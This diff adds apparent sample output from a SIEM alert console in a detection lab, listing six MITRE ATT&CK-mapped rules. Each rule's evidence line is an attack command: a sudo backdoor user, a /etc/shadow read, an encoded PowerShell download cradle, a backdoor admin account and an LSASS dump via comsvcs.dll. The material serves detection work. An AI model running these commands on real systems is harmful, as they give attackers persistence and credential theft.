@@ -1,0 +1,18 @@
+=== Wazuh / Sigma SIEM Detection Engine & MITRE ATT&CK Alert Console ===
+Endpoints Monitored : 2 (kali-endpoint-01 [172.16.167.131], WIN-WS-01.corp.local [Sysmon])
+Custom Rules Loaded : 6   Alerts Triggered: 6 (CRITICAL: 2, HIGH: 4)   False Positives: 0
+
+RuleID   Lvl  Sev       MITRE      Cnt  Endpoint                       Detection Title
+-----------------------------------------------------------------------------------------------------------------------------
+100101   10   HIGH      T1110.001  5    kali-endpoint-01               Linux SSH Brute-Force Attack (5+ Failed Logins from Same IP)
+         Evidence: Nov 21 17:58:43 kali sshd[7899]: Failed password for atomic_target from 127.0.0.1 port 56760 ssh2
+100102   12   HIGH      T1548.003  2    kali-endpoint-01               Unauthorized Linux Sudoers or Group Privilege Escalation
+         Evidence: Nov 21 17:58:43 kali usermod[7914]: add 'svc_backdoor' to shadow group 'sudo'
+100103   12   HIGH      T1003.008  1    kali-endpoint-01               Linux Credential Access on /etc/shadow via auditd
+         Evidence: Nov 21 17:58:43 kali sudo[7922]:     root : PWD=/root ; USER=root ; COMMAND=/usr/bin/head -n 2 /etc/shadow
+100201   12   HIGH      T1059.001  1    WIN-WS-01.corp.local           Windows Sysmon EventID 1 - Obfuscated / Encoded PowerShell Command
+         Evidence: powershell.exe -NoP -NonI -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8A
+100202   13   CRITICAL  T1136.001  1    WIN-WS-01.corp.local           Windows EventID 4720 / Sysmon - Unauthorized Local Admin Account Creation
+         Evidence: net.exe user backdoor_adm P@ssw0rd123! /add && net.exe localgroup administrators backdoor_adm /add
+100203   15   CRITICAL  T1003.001  1    WIN-WS-01.corp.local           Windows Sysmon EventID 1/10 - LSASS Memory Dump via comsvcs.dll MiniDump
+         Evidence: rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 644 C:\Users\Public\lsass.dmp full
